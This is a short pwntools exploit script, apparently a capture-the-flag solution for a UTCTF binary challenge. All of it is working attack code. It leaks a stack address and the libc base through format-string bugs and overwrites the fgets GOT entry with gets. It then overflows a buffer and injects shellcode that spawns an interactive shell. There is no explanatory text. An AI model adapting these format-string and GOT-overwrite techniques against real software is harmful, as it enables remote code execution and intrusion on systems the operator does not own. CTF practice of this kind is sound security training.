from pwn import *

e = ELF("./pwnable")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("binary.utctf.live", 9003)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path}, aslr=False)

p.sendlineafter("do?", "%14$llx;")

stk_leak = int(p.recvuntil(";", drop=True).strip(), 16)
print(hex(stk_leak))

p.sendlineafter("do?", "%10$s;".ljust(0x20, "\x00") + p64(e.got["puts"]))
leak = u64(p.recvuntil(";", drop=True).strip().ljust(8, "\x00")) - libc.symbols["puts"]
print(hex(leak))

def write(addr, value):
  p.sendlineafter("do?", ("%" + str(value) + "x%10$hn").ljust(0x20, "\x00") + p64(addr))

write(e.got["fgets"], (leak + libc.symbols["gets"]) % 0x100**2)
p.sendlineafter("do?", "A" * 0x48 + p64(stk_leak) + asm(shellcraft.sh()))

p.interactive()
